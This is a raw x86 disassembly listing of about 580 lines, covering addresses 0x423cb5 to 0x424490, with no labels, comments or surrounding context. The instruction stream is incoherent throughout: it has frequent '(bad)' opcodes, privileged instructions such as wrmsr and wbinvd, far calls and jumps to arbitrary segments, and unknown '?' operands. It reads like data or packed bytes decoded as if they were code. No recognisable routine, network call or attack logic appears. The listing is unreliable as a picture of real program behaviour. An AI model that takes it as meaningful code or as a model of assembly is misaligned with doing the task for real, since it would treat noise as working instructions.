  423cb5:	rcl    bl,0xfa
  423cb8:	repz dec eax
  423cba:	call   0xc081:0xfd95a0ef
  423cc1:	or     ecx,0x10b4b57
  423cc7:	xor    ch,cl
  423cc9:	test   al,0x21
  423ccb:	pop    edx
  423ccc:	push   ecx
  423ccd:	in     al,dx
  423cce:	mov    ds:0xb1a3db9e,eax
  423cd3:	jg     0x423c83
  423cd5:	test   eax,0xeb721b04
  423cda:	push   ecx
  423cdb:	test   al,0x8f
  423cdd:	popw   es
  423cdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ce0:	ja     0x423cb6
  423ce2:	adc    BYTE PTR [ebx+0x6b610247],dh
  423ce8:	js     0x423c8a
  423cea:	popf   
  423ceb:	inc    eax
  423cec:	mov    al,ds:0x2172256c
  423cf1:	fimul  DWORD PTR [eax+0x47]
  423cf4:	sbb    cl,BYTE PTR [edx+0x47bc5d54]
  423cfa:	sub    dl,0xb2
  423cfd:	outs   dx,DWORD PTR ds:[esi]
  423cfe:	sar    BYTE PTR [ebx+0x5b],cl
  423d01:	shl    DWORD PTR [esi-0x7ae83d9d],0x56
  423d08:	add    eax,0x3da764f7
  423d0d:	pop    esp
  423d0e:	mov    BYTE PTR [ecx-0x5843c980],bl
  423d14:	xor    cl,dl
  423d16:	ficom  DWORD PTR es:[edi]
  423d19:	retf   
  423d1a:	push   cs
  423d1b:	loop   0x423cc9
  423d1d:	iret   
  423d1e:	xor    eax,0x36b5b259
  423d23:	push   0xa773db2f
  423d28:	leave  
  423d29:	sub    eax,0x354fac21
  423d2e:	sbb    bh,BYTE PTR [edi+0x1eec55b2]
  423d34:	inc    esp
  423d35:	out    dx,al
  423d36:	mov    ecx,0xee166754
  423d3b:	adc    al,0x46
  423d3d:	mov    esi,DWORD PTR [ecx-0x1f8328fe]
  423d43:	or     DWORD PTR [edx-0x2e606818],esi
  423d49:	mov    esp,0xe5c1cf11
  423d4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d50:	dec    eax
  423d51:	xchg   DWORD PTR [edx],ecx
  423d53:	mov    ds:0x2565010f,eax
  423d58:	or     bl,BYTE PTR [edx]
  423d5a:	stos   BYTE PTR es:[edi],al
  423d5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d5c:	inc    esi
  423d5d:	imul   eax,DWORD PTR [ecx],0x3c
  423d60:	shl    ebp,1
  423d62:	imul   esp,DWORD PTR [edi+0x20c44cb4],0x2621addb
  423d6c:	mov    dl,0x86
  423d6e:	and    eax,0x565921d
  423d73:	inc    ebp
  423d74:	pop    ebp
  423d75:	push   ss
  423d76:	loop   0x423d02
  423d78:	cli    
  423d79:	xchg   ebp,eax
  423d7a:	push   cs
  423d7b:	daa    
  423d7c:	and    al,0xfa
  423d7e:	pop    ebx
  423d7f:	shl    DWORD PTR [ebp-0x38],cl
  423d82:	call   0xc563:0x6670b68f
  423d89:	push   esi
  423d8a:	sub    ah,BYTE PTR [edi+0x268244d8]
  423d90:	fmul   QWORD PTR [ebx-0x774c28d8]
  423d96:	and    eax,0x23030450
  423d9b:	in     eax,0x6e
  423d9d:	jne    0x423d6f
  423d9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423da0:	pop    edi
  423da1:	xor    BYTE PTR [ebp+0x6b466f27],0x64
  423da8:	mov    dl,0x6f
  423daa:	wrmsr  
  423dac:	not    ebx
  423dae:	sti    
  423daf:	mov    edi,0x4c160be5
  423db4:	rcl    DWORD PTR [edi-0x35278a86],0x9f
  423dbb:	fs test cl,al
  423dbe:	dec    ebx
  423dbf:	xchg   ebx,eax
  423dc0:	xor    bh,BYTE PTR [esi-0x48]
  423dc3:	inc    eax
  423dc4:	xor    cl,BYTE PTR [ebx]
  423dc6:	pop    eax
  423dc7:	xor    eax,edx
  423dc9:	pushf  
  423dca:	add    bl,cl
  423dcc:	dec    edi
  423dcd:	xor    BYTE PTR [eax+edi*2-0x474d1c82],0xb3
  423dd5:	jle    0x423d9b
  423dd7:	pop    esi
  423dd8:	xchg   ebp,eax
  423dd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423dda:	nop
  423ddb:	repz jle 0x423d96
  423dde:	mul    DWORD PTR [edi+0x54f323c4]
  423de4:	fsubp  st(1),st
  423de6:	and    cl,BYTE PTR [edx-0x4e]
  423de9:	sbb    al,0x55
  423deb:	ds push es
  423ded:	repnz xchg al,bl
  423df0:	(bad)  
  423df1:	or     al,0x85
  423df3:	jnp    0x423d7a
  423df5:	or     BYTE PTR [edi+eiz*8+0x2c3453e0],dh
  423dfc:	mov    dl,0x75
  423dfe:	test   eax,0xf767987e
  423e03:	js     0x423d9c
  423e05:	or     edx,DWORD PTR [edi+eax*8]
  423e08:	mov    esi,0x13e2485a
  423e0d:	aad    0x9a
  423e0f:	sub    al,0x8e
  423e11:	lds    edx,FWORD PTR [edi]
  423e13:	stos   BYTE PTR es:[edi],al
  423e14:	mov    bh,0x3e
  423e16:	and    BYTE PTR [edi-0x1f5d2d5b],ah
  423e1c:	jmp    0xb3c99c24
  423e21:	mov    bl,0x51
  423e23:	or     DWORD PTR [ebp+0x2],edi
  423e26:	mov    al,cl
  423e28:	push   edx
  423e29:	mov    ah,0x28
  423e2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e2c:	outs   dx,BYTE PTR ds:[esi]
  423e2d:	inc    esi
  423e2e:	cmp    DWORD PTR [ebx],ebx
  423e30:	sub    ch,bh
  423e32:	mov    ds:0xe437b272,al
  423e37:	push   esp
  423e38:	jp     0x423e10
  423e3a:	jmp    0x56d546ef
  423e3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e40:	jmp    0x5481:0x19962bdc
  423e47:	cmp    DWORD PTR [ebp-0x31382843],0xddbbaaab
  423e51:	out    dx,al
  423e52:	push   eax
  423e53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e54:	jg     0x423e84
  423e56:	(bad)  
  423e58:	lahf   
  423e59:	xchg   ecx,esi
  423e5b:	jno    0x423e1d
  423e5d:	or     BYTE PTR [edx-0x3f487fce],bl
  423e63:	pushf  
  423e64:	and    DWORD PTR [esi+0x5142ef07],eax
  423e6a:	call   0xebd1:0x784f39fc
  423e71:	rcr    BYTE PTR [edx-0x7846f7d3],0xb8
  423e78:	out    0x9f,al
  423e7a:	cmp    DWORD PTR [edx-0x58452767],0x565dabdb
  423e84:	sbb    BYTE PTR [edx+ebp*8],al
  423e87:	in     al,dx
  423e88:	mov    bl,0xf0
  423e8a:	test   DWORD PTR [edx+0x79],0x92d5d4f4
  423e91:	xchg   edx,eax
  423e92:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  423e94:	lods   eax,DWORD PTR ds:[esi]
  423e95:	int    0xc3
  423e97:	into   
  423e98:	xor    eax,0xb0c238d2
  423e9d:	xchg   esi,eax
  423e9e:	add    edx,DWORD PTR [esi-0x28]
  423ea1:	mov    ds:0xc520e765,al
  423ea6:	pop    ebx
  423ea7:	inc    ebx
  423ea8:	jg     0x423eb5
  423eaa:	in     eax,0x4f
  423eac:	bound  esi,QWORD PTR ds:0x9a1f23f8
  423eb2:	popf   
  423eb3:	fnstenv [eax+0x4e]
  423eb6:	inc    edi
  423eb7:	je     0x423ea6
  423eb9:	mov    BYTE PTR [ebx],ah
  423ebb:	int    0x9b
  423ebd:	mov    WORD PTR [edx+0x25],gs
  423ec0:	gs clc 
  423ec2:	into   
  423ec3:	lods   al,BYTE PTR ds:[esi]
  423ec4:	int    0xf3
  423ec6:	fcomp  DWORD PTR [ecx+0x50657832]
  423ecc:	test   BYTE PTR [edx],ah
  423ece:	popf   
  423ecf:	int    0x71
  423ed1:	test   BYTE PTR [esi-0x1a7e0da4],dl
  423ed7:	jo     0x423f34
  423ed9:	or     ebp,DWORD PTR [ebx+edx*4+0x5d]
  423edd:	stos   DWORD PTR es:[edi],eax
  423ede:	jp     0x423ec4
  423ee0:	stc    
  423ee1:	xchg   ebx,eax
  423ee2:	call   0x3105:0xe08dd67a
  423ee9:	or     bh,ah
  423eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423eec:	mov    ds:0xd848fbd8,eax
  423ef1:	sub    eax,0x91b22932
  423ef6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ef7:	(bad)  
  423ef8:	ret    0xd628
  423efb:	pop    eax
  423efc:	or     BYTE PTR [ebx],0xf9
  423eff:	dec    edi
  423f00:	xor    bh,BYTE PTR [ebp+ebp*4-0x651d25c8]
  423f07:	jle    0x423eb8
  423f09:	mov    al,ds:0xee677420
  423f0e:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f10:	xchg   BYTE PTR ds:0x78e35578,ch
  423f16:	in     eax,dx
  423f17:	cmp    cl,BYTE PTR [eax+0x48]
  423f1a:	jo     0x423f3b
  423f1c:	pop    esi
  423f1d:	adc    edi,edx
  423f1f:	test   BYTE PTR [eax-0x2c],al
  423f22:	rcr    BYTE PTR [ecx-0x2c32e7bd],0x83
  423f29:	lock call 0x4e6c:0x529b622e
  423f31:	or     eax,edx
  423f33:	mov    eax,ds:0x90835afc
  423f38:	test   BYTE PTR [eax-0x5710bf66],bh
  423f3e:	jmp    0xa8dc8b04
  423f43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f44:	jle    0x423f56
  423f46:	sbb    eax,0x717a76d3
  423f4b:	lea    esi,[edx+0x373264c4]
  423f51:	pop    ebp
  423f52:	in     eax,0xa1
  423f54:	pop    DWORD PTR [ebx+esi*1]
  423f57:	fnsave [eax]
  423f59:	adc    eax,0xcc56a03b
  423f5e:	push   0x77
  423f60:	mov    esp,0xa0bfebc6
  423f65:	cmp    al,0x32
  423f67:	mov    DWORD PTR [edx-0x50f6aa9d],esi
  423f6d:	cmc    
  423f6e:	aad    0x43
  423f70:	clc    
  423f71:	or     ebx,DWORD PTR [edx+0x75]
  423f74:	sub    al,0x88
  423f76:	cwde   
  423f77:	sub    cl,BYTE PTR [ebx]
  423f79:	ret    0x739a
  423f7c:	outs   dx,DWORD PTR ds:[esi]
  423f7d:	stos   BYTE PTR es:[edi],al
  423f7e:	xor    bl,BYTE PTR [edi-0x4abf5b6c]
  423f84:	je     0x423f7b
  423f86:	inc    ecx
  423f87:	mov    edx,0x992a4b1f
  423f8c:	pop    ecx
  423f8d:	scas   eax,DWORD PTR es:[edi]
  423f8e:	sub    DWORD PTR [edx+esi*4-0x15],ebx
  423f92:	mov    ds:0x317755f4,al
  423f97:	and    ah,BYTE PTR [ebp-0x4b0375f8]
  423f9d:	add    BYTE PTR [edx-0x80],ah
  423fa0:	add    cl,ah
  423fa2:	pop    esp
  423fa3:	lea    edi,[ebx+0x2668ed2f]
  423fa9:	jbe    0x423fc5
  423fab:	sub    cl,bh
  423fad:	or     eax,0xc18e6949
  423fb2:	std    
  423fb3:	push   esp
  423fb4:	mov    ebp,0x7388b910
  423fb9:	imul   eax,DWORD PTR [ebx-0x14],0x53
  423fbd:	aam    0x71
  423fbf:	fldenv [ebx+ecx*1+0x6822ee93]
  423fc6:	push   ebp
  423fc7:	dec    edi
  423fc8:	xlat   BYTE PTR ds:[ebx]
  423fc9:	mov    BYTE PTR [edx+0x2bfd0710],bl
  423fcf:	iret   
  423fd0:	call   0xd458:0xdda72cc3
  423fd7:	xor    al,0x93
  423fd9:	cmp    BYTE PTR [edx+0x1e83a5d1],dl
  423fdf:	pop    ds
  423fe0:	dec    ebp
  423fe1:	or     edi,DWORD PTR [ecx+ebp*4-0x2d54db57]
  423fe8:	(bad)  
  423fe9:	int    0x9a
  423feb:	ins    DWORD PTR es:[edi],dx
  423fec:	mov    eax,0xbd37a076
  423ff1:	sbb    eax,0x54f7a73e
  423ff6:	jge    0x42401b
  423ff8:	inc    esi
  423ff9:	inc    esi
  423ffa:	and    ah,BYTE PTR [ecx]
  423ffc:	mov    dl,0x38
  423ffe:	push   es
  423fff:	nop
  424000:	pop    ss
  424001:	xchg   edx,eax
  424002:	sbb    DWORD PTR [edi+ebx*2+0xb],edx
  424006:	mov    eax,ds:0xb38067a3
  42400b:	aas    
  42400c:	leave  
  42400d:	test   DWORD PTR [edx+0x4ef4b465],ebx
  424013:	mov    al,ds:0xa775dc3b
  424018:	add    DWORD PTR [ecx-0x6d447d19],edi
  42401e:	sub    ebp,DWORD PTR [edx+esi*4-0x3d909c86]
  424025:	xchg   edi,eax
  424026:	pop    esp
  424027:	ins    DWORD PTR es:[edi],dx
  424028:	inc    edx
  424029:	or     ebx,DWORD PTR [edi-0x44a0f510]
  42402f:	pop    es
  424030:	push   0xfbe09d1b
  424035:	repz pop edi
  424037:	int    0x2
  424039:	xor    dh,0x89
  42403c:	pop    ecx
  42403d:	or     al,0x9e
  42403f:	fimul  WORD PTR [ebp+0x5f]
  424042:	cmp    edi,edx
  424044:	lahf   
  424045:	xor    al,0x5a
  424047:	xor    BYTE PTR [ebx-0x4cceffaf],0x76
  42404e:	stc    
  42404f:	dec    ebx
  424050:	shl    BYTE PTR [ebx-0x5e],cl
  424053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424054:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424055:	cmp    DWORD PTR [edx],0x5ae2c2f1
  42405b:	push   ds
  42405c:	mov    dl,0xe6
  42405e:	shl    DWORD PTR [ebp-0x29126419],1
  424064:	sbb    ecx,DWORD PTR [ecx+edi*4]
  424067:	nop
  424068:	jl     0x424037
  42406a:	and    dl,BYTE PTR [edi+0x30]
  42406d:	adc    DWORD PTR [ecx-0x1e],esp
  424070:	mov    dl,0x1d
  424072:	sub    DWORD PTR [ebp+0x354a79d3],0xffffffb5
  424079:	or     edi,DWORD PTR [edi]
  42407b:	sbb    dl,dl
  42407d:	jbe    0x42408f
  42407f:	cs pop esi
  424081:	outs   dx,DWORD PTR ds:[esi]
  424082:	xchg   ebp,eax
  424083:	arpl   WORD PTR [edi],di
  424085:	xor    DWORD PTR [esi+0x47],edi
  424088:	popa   
  424089:	xchg   edi,eax
  42408a:	sbb    BYTE PTR [ecx-0x5a],0xb
  42408e:	shl    ebx,cl
  424090:	mov    esp,0xe9572e27
  424095:	xchg   ecx,eax
  424096:	cdq    
  424097:	test   DWORD PTR [ebp+0x5377aa8d],0x2dc4c983
  4240a1:	out    0x3c,eax
  4240a3:	mov    al,ds:0x20a75256
  4240a8:	dec    edx
  4240a9:	stos   DWORD PTR es:[edi],eax
  4240aa:	mov    edi,0x9a79f725
  4240af:	dec    ecx
  4240b0:	xor    bl,BYTE PTR [esi]
  4240b2:	(bad)  
  4240b3:	dec    ebx
  4240b4:	iret   
  4240b5:	mov    al,ds:0xda0fa773
  4240ba:	sub    al,ch
  4240bc:	lock xchg edx,eax
  4240be:	jl     0x424068
  4240c0:	dec    esi
  4240c1:	xchg   ebp,eax
  4240c2:	call   0x5678:0x1311232b
  4240c9:	das    
  4240ca:	push   0x4e2490a6
  4240cf:	into   
  4240d0:	mov    edx,0xa987c926
  4240d5:	mov    ebp,0xfabcf098
  4240da:	fwait
  4240db:	ss cld 
  4240dd:	enter  0x7ef,0x52
  4240e1:	stos   BYTE PTR es:[edi],al
  4240e2:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4240e4:	push   ebx
  4240e5:	std    
  4240e6:	popa   
  4240e7:	sbb    esp,DWORD PTR [eax]
  4240e9:	and    al,BYTE PTR [edi+0x12]
  4240ec:	mov    dl,0xde
  4240ee:	fwait
  4240ef:	add    al,0x26
  4240f1:	mul    DWORD PTR [edx+eax*2+0x6b]
  4240f5:	or     ebp,DWORD PTR [ecx]
  4240f7:	shrd   ebp,eax,0x10
  4240fb:	test   BYTE PTR [ebx+edx*2],bh
  4240fe:	enterw 0x7dbd,0x46
  424103:	mov    eax,ds:0x2ea86827
  424108:	cli    
  424109:	(bad)  [eax]
  42410b:	fsub   QWORD PTR [ebx]
  42410d:	or     ebp,edx
  42410f:	sub    al,BYTE PTR [edi]
  424111:	jmp    0x424098
  424113:	pop    ebx
  424114:	sub    eax,0x6aaa9a38
  424119:	pop    ecx
  42411a:	pusha  
  42411b:	mov    esi,0xa7a6c942
  424120:	cli    
  424121:	xchg   edi,eax
  424122:	popf   
  424123:	inc    esi
  424124:	jmp    DWORD PTR [ebx+0x7d]
  424127:	fnsave [ebp-0x2ed4e24f]
  42412d:	pusha  
  42412e:	mov    dh,dh
  424130:	je     0x4240c1
  424132:	add    al,0xa8
  424134:	or     al,0x1
  424136:	sub    al,0x6b
  424138:	push   edx
  424139:	(bad)  
  42413a:	pop    edi
  42413b:	push   ebx
  42413c:	fadd   DWORD PTR [esi]
  42413e:	call   0x9026:0x7d175035
  424145:	inc    esp
  424146:	idiv   DWORD PTR [ecx+0x6e0d0e86]
  42414c:	cli    
  42414d:	aaa    
  42414e:	call   0xae55:0xc8978022
  424155:	mov    esp,0xd23568a1
  42415a:	mov    esp,0xf4cf32dc
  42415f:	sbb    DWORD PTR [ebp-0x34c4a4f4],ecx
  424165:	pop    ss
  424166:	cmp    al,0x27
  424168:	push   edi
  424169:	mov    bl,0x7b
  42416b:	and    al,0xb9
  42416d:	jl     0x424138
  42416f:	xchg   ebx,eax
  424170:	xchg   edx,eax
  424171:	add    DWORD PTR [ebx+0x828b230],esi
  424177:	jmp    0x4241b8
  424179:	and    al,0xac
  42417b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42417c:	mov    ah,bl
  42417e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42417f:	addr16 jno 0x424148
  424182:	popf   
  424183:	adc    BYTE PTR [eax-0x2f6a8b77],dh
  424189:	cmp    BYTE PTR [edi+0x20],ah
  42418c:	add    DWORD PTR [ebp+0x7b],ebx
  42418f:	jge    0x4241b7
  424191:	scas   eax,DWORD PTR es:[edi]
  424192:	outs   dx,BYTE PTR ds:[esi]
  424193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424194:	test   BYTE PTR [ebx],0x33
  424197:	jl     0x424177
  424199:	fwait
  42419a:	imul   eax,DWORD PTR [eax],0x9a9ab139
  4241a0:	addr16 sbb al,0x2f
  4241a3:	and    DWORD PTR ds:0x3aa7604d,esp
  4241a9:	cmc    
  4241aa:	call   0x46aaa4b7
  4241af:	in     al,0xb2
  4241b1:	dec    edi
  4241b2:	mov    al,0x5f
  4241b4:	out    dx,eax
  4241b5:	pop    esp
  4241b6:	xchg   ebp,eax
  4241b7:	inc    edx
  4241b8:	and    DWORD PTR [ecx],ecx
  4241ba:	clc    
  4241bb:	hlt    
  4241bc:	popf   
  4241bd:	test   al,0xb1
  4241bf:	push   ss
  4241c0:	ror    BYTE PTR [edx+0xe8a1963],cl
  4241c6:	dec    ebx
  4241c7:	sub    BYTE PTR [edi+0x6947a906],ah
  4241cd:	arpl   dx,bp
  4241cf:	and    ch,al
  4241d1:	or     edi,edx
  4241d3:	mov    ?,WORD PTR [esi-0x7f]
  4241d6:	not    BYTE PTR [esi+0x20]
  4241d9:	pop    edx
  4241da:	call   0xcebf:0x7c5f7526
  4241e1:	sbb    DWORD PTR [ebx-0x59],esp
  4241e4:	cdq    
  4241e5:	mov    eax,0x7d821b2e
  4241ea:	rcr    BYTE PTR [edx],cl
  4241ec:	inc    esp
  4241ed:	out    dx,eax
  4241ee:	call   0x46d9:0xd7587ee3
  4241f5:	mov    esi,0xab91a6be
  4241fa:	xor    al,0x75
  4241fc:	mov    dh,0x39
  4241fe:	push   edx
  4241ff:	arpl   WORD PTR [ebp+0x1a],ax
  424202:	outs   dx,BYTE PTR ds:[esi]
  424203:	lock mov dl,0xfa
  424206:	pop    ds
  424207:	pop    DWORD PTR cs:[edx-0x49]
  42420b:	pop    ecx
  42420c:	push   ss
  42420d:	jle    0x4241f9
  42420f:	mov    bl,0xc8
  424211:	fsubr  st,st(4)
  424213:	dec    esi
  424214:	mov    bl,0x9c
  424216:	mov    ecx,0xc0a3d94e
  42421b:	push   ebx
  42421c:	fcmovnbe st,st(2)
  42421e:	popf   
  42421f:	mov    cs,WORD PTR [esi+edx*2+0x6e825059]
  424226:	fwait
  424227:	sar    esp,cl
  424229:	jecxz  0x424228
  42422b:	dec    DWORD PTR [esi+0x29]
  42422e:	call   0x7e9f:0x4e527da3
  424235:	mov    ss,WORD PTR [edx+ecx*1-0x58b21ba9]
  42423c:	(bad)  
  42423d:	jns    0x4241c6
  42423f:	test   al,0xec
  424241:	or     ebx,DWORD PTR [ebx+0x26]
  424244:	cmp    al,0x0
  424246:	sbb    eax,0xe9428eea
  42424b:	enter  0xb7b3,0x20
  42424f:	(bad)  
  424250:	scas   eax,DWORD PTR es:[edi]
  424251:	aas    
  424252:	out    dx,al
  424253:	inc    ecx
  424254:	dec    esi
  424255:	pop    ds
  424256:	pop    ebp
  424257:	popf   
  424258:	and    ah,BYTE PTR [esi-0x66]
  42425b:	dec    eax
  42425c:	mov    cl,0xfa
  42425e:	fbld   TBYTE PTR [eax+0x3be0fef]
  424264:	jmp    FWORD PTR [ebx]
  424266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424267:	scas   al,BYTE PTR es:[edi]
  424268:	mul    BYTE PTR [ecx+0x2f]
  42426b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42426c:	jnp    0x4242da
  42426e:	pop    ebp
  42426f:	retf   
  424270:	lds    eax,FWORD PTR [eax]
  424272:	arpl   WORD PTR [eax-0x5035077d],sp
  424278:	mov    dl,0xa8
  42427a:	inc    ebp
  42427b:	addr16 sub eax,0x42251b0d
  424281:	and    eax,0xbf9dae4
  424286:	jo     0x4242d4
  424288:	inc    ebx
  424289:	add    bl,BYTE PTR [ebx+0x6266b22a]
  42428f:	mov    edi,0x6b60087c
  424294:	lahf   
  424295:	or     bh,ah
  424297:	inc    ebp
  424298:	stos   DWORD PTR es:[edi],eax
  424299:	mov    ah,0xb0
  42429b:	jge    0x4242ef
  42429d:	cdq    
  42429e:	out    dx,al
  42429f:	fnstenv [edx-0x2e0a7a2d]
  4242a5:	leave  
  4242a6:	xor    ecx,eax
  4242a8:	or     BYTE PTR [ebx],0x7e
  4242ab:	test   eax,edi
  4242ad:	xor    BYTE PTR [ebp+0x4c],ch
  4242b0:	xchg   esp,eax
  4242b1:	imul   ch
  4242b3:	mov    ecx,0x6080aeb7
  4242b8:	popf   
  4242b9:	xor    eax,0x8fc1835a
  4242be:	dec    ecx
  4242bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242c0:	inc    esi
  4242c1:	fst    DWORD PTR [ebx]
  4242c3:	jle    0x4242e6
  4242c5:	push   es
  4242c6:	div    BYTE PTR gs:[edx+0x53ac56b7]
  4242cd:	pop    ds
  4242ce:	jg     0x4242ed
  4242d0:	inc    ecx
  4242d1:	or     esi,DWORD PTR [eax+0x4b2eb459]
  4242d7:	pop    es
  4242d8:	fld    QWORD PTR [edi+eiz*4+0x230bd20f]
  4242df:	popf   
  4242e0:	xor    al,0x73
  4242e2:	sar    BYTE PTR [ebp+eiz*8+0xb],0x40
  4242e7:	(bad)  
  4242e8:	adc    al,0xaf
  4242ea:	pop    esp
  4242eb:	sbb    DWORD PTR [ecx+ebp*4-0x3ad3a66],edi
  4242f2:	jae    0x424348
  4242f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242f5:	ret    0xa6d1
  4242f8:	add    eax,0xc4f055f5
  4242fd:	dec    edx
  4242fe:	cmp    eax,0x9a6d9447
  424303:	jmp    0x347:0xbc68cf3e
  42430a:	stc    
  42430b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42430c:	xor    al,0xe1
  42430e:	imul   ecx,DWORD PTR [ecx-0x65],0xb23de8a5
  424315:	retf   0xc8b4
  424318:	dec    ebp
  424319:	outs   dx,BYTE PTR ds:[esi]
  42431a:	mov    ebp,esp
  42431c:	jns    0x424328
  42431e:	iret   
  42431f:	loop   0x424356
  424321:	add    BYTE PTR [ecx],ah
  424323:	outs   dx,DWORD PTR ds:[esi]
  424324:	cmp    al,0xff
  424326:	mov    cl,0x83
  424328:	mov    dl,0x99
  42432a:	stos   BYTE PTR es:[edi],al
  42432b:	idiv   DWORD PTR [eax]
  42432d:	fwait
  42432e:	hlt    
  42432f:	add    BYTE PTR [bp+di],cl
  424332:	xchg   ebp,eax
  424333:	adc    DWORD PTR [ebp+0x6162b9fc],ebx
  424339:	push   ebp
  42433a:	call   0x5ee5:0x4eabef22
  424341:	data16 jo 0x4242e9
  424344:	xchg   ebp,eax
  424345:	call   0x3cbdbfac
  42434a:	cli    
  42434b:	xchg   ebp,eax
  42434c:	mov    esi,0x3fb29ba5
  424351:	(bad)
  424355:	xor    al,BYTE PTR [esi+0x1f]
  424358:	mov    eax,0x6e3f2bef
  42435d:	xor    ebp,ebx
  42435f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424360:	(bad)  
  424361:	or     esp,ebx
  424363:	(bad)  
  424364:	pushf  
  424365:	(bad)  
  424366:	outs   dx,DWORD PTR ds:[esi]
  424367:	sub    eax,0x3d9a4790
  42436c:	adc    al,0xf5
  42436e:	mov    DWORD PTR [ebp+ebp*8+0x41],edi
  424372:	into   
  424373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424374:	mov    ebp,0x44d2b208
  424379:	bound  edi,QWORD PTR [edi+0x6c]
  42437c:	mov    dl,0x39
  42437e:	cli    
  42437f:	and    al,0xd3
  424381:	mov    al,0x4c
  424383:	stos   BYTE PTR es:[edi],al
  424384:	push   cs
  424385:	or     eax,DWORD PTR [edx+0x0]
  424388:	mov    al,ds:0xcc8b2fba
  42438d:	stos   DWORD PTR es:[edi],eax
  42438e:	call   0xd18e:0x79cd909b
  424395:	ds mov esp,0xa9042a57
  42439b:	or     eax,0xbfcce493
  4243a0:	outs   dx,DWORD PTR ds:[esi]
  4243a1:	adc    eax,0x6b2af64
  4243a6:	inc    esp
  4243a7:	xor    DWORD PTR [ebx],ebp
  4243a9:	sub    DWORD PTR es:[esi],edx
  4243ac:	inc    eax
  4243ad:	wbinvd 
  4243af:	test   al,0x7c
  4243b1:	xor    cl,BYTE PTR [ebx+0x27]
  4243b4:	mov    bh,0xa6
  4243b6:	retf   0xb378
  4243b9:	xchg   DWORD PTR [ebp+0x8],ebx
  4243bc:	sar    BYTE PTR [ebp+esi*4-0x16],cl
  4243c0:	jp     0x424397
  4243c2:	push   edi
  4243c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243c4:	pop    ebx
  4243c5:	(bad)  
  4243c6:	jp     0x4243aa
  4243c8:	sbb    ebp,edi
  4243ca:	sub    al,0x95
  4243cc:	mov    dl,0x31
  4243ce:	iret   
  4243cf:	push   ecx
  4243d0:	pop    eax
  4243d1:	enter  0x6807,0x43
  4243d5:	or     edx,DWORD PTR [ecx-0x7d]
  4243d8:	and    eax,0x1c99bc92
  4243dd:	or     bl,BYTE PTR [edx-0x42e70138]
  4243e3:	arpl   WORD PTR ss:[eax-0x78],bx
  4243e7:	aaa    
  4243e8:	or     DWORD PTR [ebx],0xffffffaf
  4243eb:	fild   WORD PTR [esi-0x28df0e64]
  4243f1:	test   ebx,esp
  4243f3:	shl    BYTE PTR [edx-0x53314029],cl
  4243f9:	(bad)  
  4243fa:	mov    al,ds:0xca04a27f
  4243ff:	lahf   
  424400:	fs jo  0x42441c
  424403:	sub    BYTE PTR [ebp-0x2ccba5e6],bh
  424409:	mov    ecx,0xb4fac29a
  42440e:	aam    0xb2
  424410:	sub    edx,DWORD PTR [edi+0x7262a785]
  424416:	inc    ecx
  424417:	in     eax,0x28
  424419:	mov    ?,eax
  42441b:	dec    eax
  42441d:	pop    edx
  42441e:	xchg   DWORD PTR [esi+0x7c],esi
  424421:	test   dl,bl
  424423:	ins    BYTE PTR es:[edi],dx
  424424:	and    eax,0xf9eef9ed
  424429:	and    al,0xe5
  42442b:	rol    edi,1
  42442d:	mov    ecx,ecx
  42442f:	jp     0x42440c
  424431:	dec    ecx
  424432:	ins    DWORD PTR es:[edi],dx
  424433:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424434:	cmp    DWORD PTR [ebx-0x3faaad4e],ebp
  42443a:	mov    dl,BYTE PTR [eax]
  42443c:	or     ah,BYTE PTR [edi]
  42443e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42443f:	mov    ch,0x94
  424441:	mov    esp,DWORD PTR [esi+ebx*8-0x3d]
  424445:	fidivr WORD PTR [eax+0x54]
  424448:	(bad)  
  424449:	sub    eax,0xb797bc2
  42444e:	je     0x4244be
  424450:	xchg   ecx,eax
  424451:	mov    eax,DWORD PTR [ebx+0xc]
  424454:	mov    dl,0x3d
  424456:	jl     0x4244a3
  424458:	cmp    eax,0x499ec869
  42445d:	and    eax,0x150d92c5
  424462:	ins    DWORD PTR es:[edi],dx
  424463:	leave  
  424464:	and    DWORD PTR [ebx],ecx
  424466:	sub    al,0x9
  424468:	and    dh,dl
  42446a:	jp     0x42444a
  42446c:	mov    dl,0x3f
  42446e:	or     esp,DWORD PTR [ebp+0x3e]
  424471:	mov    esi,0xb06882d
  424476:	in     eax,dx
  424477:	retf   0x5e50
  42447a:	cmp    al,0xa4
  42447c:	adc    BYTE PTR [eax-0x18],bl
  42447f:	lock mov ch,0xc7
  424482:	out    dx,eax
  424483:	imul   esi,DWORD PTR [edi+0x4a],0xa60cc785
  42448a:	adc    DWORD PTR [ebx-0x582a04b0],edi
  424490:	outs   dx,BYTE PTR ds:[esi]
